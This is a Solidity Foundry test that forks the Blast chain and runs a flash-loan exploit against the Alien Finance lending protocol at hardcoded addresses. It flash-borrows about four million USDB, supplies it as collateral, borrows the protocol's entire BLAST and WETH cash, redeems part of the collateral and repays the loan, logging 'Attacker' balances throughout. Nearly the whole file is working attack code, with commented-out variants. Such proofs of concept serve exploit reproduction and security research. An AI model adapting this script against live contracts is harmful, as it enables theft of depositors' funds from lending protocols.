// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IWETH.sol";
import "./test/interfaces/IUni_Pair_V2.sol";

interface IAToken {
    function balanceOf(address account) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IAlienFinance {
    function supply(address from, address to, address market, uint256 amount) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function redeem(address from, address to, address asset, uint256 amount) external;
    function repay(address from, address to, address asset, uint256 amount) external;
    function setUserExtension(address extension, bool allowed) external;
    function getUserAllowedExtensions(address user) external view returns (address[] memory);
    function getExchangeRate(address market) external view returns (uint256);
    function deferLiquidityCheck(address user, bytes memory data) external;
    function getTotalCash(address market) external view returns (uint256);

    function getBorrowBalance(address user, address market) external view returns (uint256);
    function getAccountLiquidity(address user) external view returns (uint256, uint256, uint256);
    function isUserLiquidatable(address user) external view returns (bool);
    function calculateLiquidationOpportunity(address marketBorrow, address marketCollateral, uint256 repayAmount) external view returns (uint256);
}

interface IBlasterswapV2Callee {
    function blasterswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Thruster_flashloanTest is Test {
    IUni_Pair_V2 private bltpair = IUni_Pair_V2(0x3b5d3f610Cc3505f4701E9FB7D0F0C93b7713adD);
    IUni_Pair_V2 private pair = IUni_Pair_V2(0x12c69BFA3fb3CbA75a1DEFA6e976B87E233fc7df);
    address private constant usbd = 0x4300000000000000000000000000000000000003;
    address private constant blast = 0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad;
    address private constant weth = 0x4300000000000000000000000000000000000004;
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    IAToken public atoken = IAToken(0x6fF7A155557C4B516a062dFA65704b3158ea9ACf);
    address private attacker;
    event log_named_bool(string key, bool value);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 5561255);
        attacker = msg.sender;
        deal(address(usbd), address(this), 30000 ether);
        
    }

    function testExploit() public {
        emit log_named_decimal_uint("[After] Attacker blast before flashloan", IERC20(usbd).balanceOf(address(this)), 18);
        uint256 totoalcashforblast = Allien.getTotalCash(blast);
        uint256 totoalcashforweth = Allien.getTotalCash(weth);
        uint256 totoalcashforusbd = Allien.getTotalCash(usbd);
        emit log_named_decimal_uint("blast totoal cash before supply before flashloan",totoalcashforblast, 18);
        emit log_named_decimal_uint("weth totoal cash before supply before flashloan", totoalcashforweth, 18);
        emit log_named_decimal_uint("usbd totoal cash before supply before flashloan", totoalcashforusbd, 18);
        
        

        bytes memory data = abi.encode(usbd, 1999990 * 10**18);
        pair.swap(3999999 * 10**18, 0, address(this), data);

        // bytes memory data2 = abi.encode(usbd, 2000000 * 10**18);
        // bltpair.swap(2000000 * 10**18, 0, address(this), data2);

        emit log_named_decimal_uint("[After] Attacker blast after flashloan", IERC20(usbd).balanceOf(address(this)), 18);
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        emit log_named_decimal_uint("[After] Attacker blast during first flash", IERC20(usbd).balanceOf(address(this)), 18);
        getuserstatusbefore();
        FirstSupply();
        emit log_named_decimal_uint("[After] Attacker blast during second flash loan", IERC20(usbd).balanceOf(address(this)), 18);
        getuserstatusbefore();
        borrowblast();
        getuserstatusbefore();
        // getuserstatus();
        borrowweth();
        getuserstatusbefore();
        redeem2musbd();
        getuserstatusbefore();
        checkliqudate();
        // getuserstatus();
        // borrowmoreusbd();
        // getuserstatus();

        // SecondSupplyAndRedeem();
        // FirstSupplyAndRedeem();
        

        uint256 fee = (uint256(3999999 * 10**18) * 3) / 997 + 1;
        emit log_named_decimal_uint("[After] fee to pay during ", fee, 18);
        uint256 amountToRepay = 3999999 * 10**18 + fee;
        emit log_named_decimal_uint("[After] flash loan amount to repay", amountToRepay, 18);
        // uint256 fee2 = (uint256(2000000 * 10**18) * 3) / 997 + 1;
        // emit log_named_decimal_uint("[After] fee2 to pay during ", fee2, 18);
        // uint256 amountToRepay2 = 2000000 * 10**18 + fee2;
        // emit log_named_decimal_uint("[After] flash2 loan amount to repay", amountToRepay2, 18);

        // Ensure we have enough balance to repay the loan
        require(IERC20(usbd).balanceOf(address(this)) >= amountToRepay, "Insufficient balance to repay the loan");
        // require(IERC20(usbd).balanceOf(address(this)) >= amountToRepay2, "Insufficient balance to repay the loan2");
        // Repay the loan
        IERC20(usbd).transfer(address(pair), amountToRepay);
        // IERC20(usbd).transfer(address(bltpair), amountToRepay2);

     
    }

    // function blasterswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data2) external {
    //     emit log_named_decimal_uint("[After] Attacker blast during second flash loan", IERC20(usbd).balanceOf(address(this)), 18);
    //     getuserstatusbefore();
    //     borrowblast();
    //     getuserstatus();
    //     borrowweth();
    //     getuserstatus();
    //     // borrowmoreusbd();
    //     // getuserstatus();

    //     SecondSupplyAndRedeem();
        

    //     uint256 fee = (uint256(3999999 * 10**18) * 3) / 997 + 1;
    //     emit log_named_decimal_uint("[After] fee to pay during ", fee, 18);
    //     uint256 amountToRepay = 3999999 * 10**18 + fee;
    //     emit log_named_decimal_uint("[After] flash loan amount to repay", amountToRepay, 18);
    //     uint256 fee2 = (uint256(2000000 * 10**18) * 3) / 997 + 1;
    //     emit log_named_decimal_uint("[After] fee2 to pay during ", fee2, 18);
    //     uint256 amountToRepay2 = 2000000 * 10**18 + fee2;
    //     emit log_named_decimal_uint("[After] flash2 loan amount to repay", amountToRepay2, 18);

    //     // Ensure we have enough balance to repay the loan
    //     require(IERC20(usbd).balanceOf(address(this)) >= amountToRepay, "Insufficient balance to repay the loan");
    //     require(IERC20(usbd).balanceOf(address(this)) >= amountToRepay2, "Insufficient balance to repay the loan2");
    //     // Repay the loan
    //     IERC20(usbd).transfer(address(pair), amountToRepay);
    //     IERC20(usbd).transfer(address(bltpair), amountToRepay2);
    // }

    function FirstSupply() internal {
        emit log_named_decimal_uint("[During] Attacker balance during first flash loan", IERC20(usbd).balanceOf(address(this)), 18);
        // Your exploit or operations go here
        // Example: Supply and redeem USDB
        uint256 usbdexchangeRate = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint("[During] usbd Exchange rate before supply", usbdexchangeRate, 18);
        uint256 wethexchangeRate = Allien.getExchangeRate(address(weth));
        emit log_named_decimal_uint("[During] weth Exchange rate before supply", wethexchangeRate, 18);
        uint256 blastexchangeRate = Allien.getExchangeRate(address(blast));
        emit log_named_decimal_uint("[During] Exchange rate before supply", blastexchangeRate, 18);

        uint256 Totalcash = Allien.getTotalCash(address(usbd));
        emit log_named_decimal_uint("[During] total cash before any supply", Totalcash, 18);

        uint256 balanceBeforeSupply = IERC20(usbd).balanceOf(address(this));
        IERC20(usbd).approve(address(Allien), balanceBeforeSupply);
        emit log_named_decimal_uint("[During] USDB balance before supply", balanceBeforeSupply, 18);
        Allien.supply(address(this), address(this), address(usbd), balanceBeforeSupply);

        uint256 fstTotalcash = Allien.getTotalCash(address(usbd));
        emit log_named_decimal_uint("[During] first total cash", fstTotalcash, 18);

        uint256 afterExchangeRate = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint("[During] Exchange rate after supply", afterExchangeRate, 18);

        uint256 atokenBalance = atoken.balanceOf(address(this));
        emit log_named_decimal_uint("[During] AToken balance after supply", atokenBalance, 18);

        // Allien.redeem(address(this), address(this), address(usbd), atoken.balanceOf(address(this)));

        uint256 ExchangeRateafterredeem = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint("[During] Exchange rate after redeem", ExchangeRateafterredeem, 18);

    }

    function SecondSupplyAndRedeem() internal {
        emit log_named_decimal_uint("[During] Attacker balance after second flash loan", IERC20(usbd).balanceOf(address(this)), 18);
        // Your exploit or operations go here
        // Example: Supply and redeem USDB
        uint256 usbdexchangeRate = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint("[During] usbd Exchange rate second supply", usbdexchangeRate, 18);
        uint256 wethexchangeRate = Allien.getExchangeRate(address(weth));
        emit log_named_decimal_uint("[During] weth Exchange rate second supply", wethexchangeRate, 18);
        uint256 blastexchangeRate = Allien.getExchangeRate(address(blast));
        emit log_named_decimal_uint("[During] Exchange rate second supply", blastexchangeRate, 18);

        uint256 balanceBeforeSupply = IERC20(usbd).balanceOf(address(this));
        IERC20(usbd).approve(address(Allien), balanceBeforeSupply);
        emit log_named_decimal_uint("[During] USDB balance before second supply", balanceBeforeSupply, 18);
        Allien.supply(address(this), address(this), address(usbd), balanceBeforeSupply);

        uint256 scdTotalcash = Allien.getTotalCash(address(usbd));
        emit log_named_decimal_uint("[During] second total cash", scdTotalcash, 18);

        uint256 lstExchangeRate = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint("[During] last Exchange rate after supply", lstExchangeRate, 18);

        uint256 atokenBalance = atoken.balanceOf(address(this));
        emit log_named_decimal_uint("[During] AToken balance after second supply", atokenBalance, 18);

        Allien.redeem(address(this), address(this), address(usbd), atoken.balanceOf(address(this)));

        uint256 ExchangeRateafterredeem = Allien.getExchangeRate(address(usbd));
        emit log_named_decimal_uint("[During] Exchange rate after redeem", ExchangeRateafterredeem, 18);
    }

    function borrowblast() internal {

        uint256 ttcashblastafsupply = Allien.getTotalCash(blast); // 5 WETH with 18 decimals
        emit log_named_decimal_uint("totoal cash for blast", ttcashblastafsupply, 18);
        Allien.borrow(address(this), address(this), address(blast), ttcashblastafsupply);
        emit log_named_decimal_uint("[After] Attacker blast borrowed during exploit", IERC20(blast).balanceOf(address(this)), 18);
    }

    function borrowweth() internal {
        uint256 ttcashwethafsupply = Allien.getTotalCash(weth); // 5 WETH with 18 decimals
        emit log_named_decimal_uint("totoal cash for weth", ttcashwethafsupply, 18);
        Allien.borrow(address(this), address(this), address(weth), ttcashwethafsupply);
        emit log_named_decimal_uint("[After] Attacker weth borrowed during exploit", IERC20(weth).balanceOf(address(this)), 18);
    }

    function borrowmoreusbd() internal {

        uint256 ttcashusbdafsupply = Allien.getTotalCash(usbd); // 5 WETH with 18 decimals
        emit log_named_decimal_uint("totoal cash for usbd", ttcashusbdafsupply, 18);
        Allien.borrow(address(this), address(this), address(blast), ttcashusbdafsupply);
        emit log_named_decimal_uint("[After] Attacker more usbd borrowed during exploit", IERC20(usbd).balanceOf(address(this)), 18);
    }

    function getuserstatus() internal {

        (uint256 fothercollateralValue, uint256 fotherliquidationCollateralValue, uint256 fotherdebtValue) = Allien.getAccountLiquidity(address(this));
        emit log_named_decimal_uint("Collateral Value", fothercollateralValue, 18);
        emit log_named_decimal_uint("Liquidation Collateral Value", fotherliquidationCollateralValue, 18);
        emit log_named_decimal_uint("Debt Value", fotherdebtValue, 18);
    }

    function getuserstatusbefore() internal {

        (uint256 collateralValue, uint256 liquidationCollateralValue, uint256 debtValue) = Allien.getAccountLiquidity(address(this));
        emit log_named_decimal_uint("Collateral Value", collateralValue, 18);
        emit log_named_decimal_uint("Liquidation Collateral Value", liquidationCollateralValue, 18);
        emit log_named_decimal_uint("Debt Value", debtValue, 18);
    }

    function redeem2musbd() internal {
    
        Allien.redeem(address(this), address(this), address(usbd), atoken.balanceOf(address(this)) / 2 + 1_029_999 * 10**18);
        emit log_named_decimal_uint("atoken balance after redeem half", atoken.balanceOf(address(this)), 18);
    }
    function checkliqudate() internal {

        bool isLiquidatable = Allien.isUserLiquidatable(address(this));
        emit log_named_bool("Is User Liquidatable", isLiquidatable);

        if (isLiquidatable) {
            emit log_named_string("Status", "User is liquidatable");
        } else {
            emit log_named_string("Status", "User is not liquidatable");
        }

        uint256 seizeAmount = Allien.calculateLiquidationOpportunity(address(usbd), address(blast), IERC20(usbd).balanceOf(address(this)));
        emit log_named_decimal_uint("Seize Amount", seizeAmount, 18);

    }

    receive() external payable {}
}
